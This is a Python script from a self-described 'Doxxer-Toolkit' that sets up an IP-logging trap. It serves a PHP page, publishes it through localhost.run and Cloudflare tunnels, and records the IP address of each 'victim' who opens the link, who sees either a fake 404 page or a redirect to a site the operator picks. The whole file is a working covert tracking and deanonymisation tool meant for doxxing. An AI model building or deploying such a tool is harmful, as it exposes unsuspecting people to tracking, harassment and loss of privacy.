# IPlogger de Doxxer-Toolkit
# Codigo adaptado de: https://github.com/Euronymou5/IPlogger

from re import search
import os
from os.path import isfile
from subprocess import DEVNULL, PIPE, Popen, STDOUT
import time

def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

error_file = "logs/error.log"

def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")

def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)

cf_file = "logs/cf.log"
lh_file = "logs/lh.log"

cf_log = open(cf_file, 'w')
lh_log = open(lh_file, 'w')

ruta = os.getcwd()

def check():
    while True:
        if os.path.isfile(f'{ruta}/.pages/IPlogger_en/ip.txt'):
          print()
          print("\n\033[94m[~] Victim's IP found!")
          with open(f'{ruta}/.pages/IPlogger_en/ip.txt') as ip:
            lines = ip.read().rstrip()
            if len(lines) != 0:
                print()

                os.system(f"cat {ruta}/.pages/IPlogger_en/ip.txt")
                os.system(f"cat {ruta}/.pages/IPlogger_en/ip.txt >> {ruta}/.pages/IPlogger_en/ip_saved.txt")

                print(f'\n\n\033[32m[~] IPs saved in: {ruta}/.pages/IPlogger_en/ip_saved.txt')

                os.remove(f"{ruta}/.pages/IPlogger_en/ip.txt")
          ip.close()

def menu():
    var1 = input('\n[~] ¿Do you want to use the default page? (Error 404 HTML) [Y/n]: ')
    if var1 == "y" or var1 == "Y":
        file = open(f'{ruta}/.pages/IPlogger_en/index.php', 'r+')
        ler = file.read()
        file.close()
        if "index.html" in ler:
           print('\n[~] Using port: 8080')
           print('\n[~] Creating link...')

           time.sleep(2)
           os.system(f"php -S localhost:8080 -t {ruta}/.pages/IPlogger_en > /dev/null 2>&1 &")


           bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lh_log, stderr=lh_log)

           ola = False
           for i in range(10):
               lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lh_file)
               if lhr_url != "":
                   ola = True
                   break
               time.sleep(1)

           bgtask(f"./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
           cf_success = False
           for i in range(10):
               cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
               if cf_url != "":
                    cf_success = True
                    break
               time.sleep(1)

           print(f'\n\033[32m[~] Localhost.run: {lhr_url}')
           print(f'\n\033[32m[~] Cloudflare URL: {cf_url}')      
            
           print('\n\033[33m[~] Waiting for data...')
           check()
           
        else:
           global file2

           os.remove(f'{ruta}/.pages/IPlogger_en/index.php')

           file2 = open(f'{ruta}/.pages/IPlogger_en/index.php', 'w')
           file2.write("""<?php
include 'ip.php';
header('Location: index.html');
exit();
?>""")
           file2.close()
           print('\n[~] Using port: 8080')
           print('\n[~] Creating link...')

           time.sleep(2)

           os.system(f"php -S localhost:8080 -t {ruta}/.pages/IPlogger_en > /dev/null 2>&1 &")
           bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lh_log, stderr=lh_log)

           ola = False
           for i in range(10):
               lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lh_file)
               if lhr_url != "":
                    ola = True
                    break
               time.sleep(1)

           bgtask(f"./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)

           cf_success = False
           for i in range(10):
               cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
               if cf_url != "":
                    cf_success = True
                    break
               time.sleep(1)

           print(f'\n\033[32m[~] Localhost.run: {lhr_url}')
           print(f'\n\033[32m[~] Cloudflared: {cf_url}')

           print('\n\033[33m[~] Waiting for data...')
           check()


    # Redireccion      
    else:
           link = input('\n[~] Enter a url to redirect the victim (e.x: https://youtube.com): ')

           file = open(f'{ruta}/.pages/IPlogger_en/index.php', 'w')
           file.write("""<?php
include 'ip.php';
header('Location: index.html');
exit();
?>""".replace("index.html", link))
           file.close()

           print('\n[~] Using port: 8080')
           print('\n[~] Creating link...')

           os.system(f"php -S localhost:8080 -t {ruta}/.pages/IPlogger_en > /dev/null 2>&1 &")
           bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lh_log, stderr=lh_log)

           ola = False
           for i in range(10):
               lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lh_file)
               if lhr_url != "":
                    ola = True
                    break
               time.sleep(1)

           bgtask(f"./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)

           cf_success = False
           for i in range(10):
               cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
               if cf_url != "":
                    cf_success = True
                    break
               time.sleep(1)

           print(f'\n\033[32m[~] Localhost.run: {lhr_url}')
           print(f'\n\033[32m[~] Cloudflared: {cf_url}')

           print('\n\033[33m[~] Waiting for data...')
           check()        
        
menu()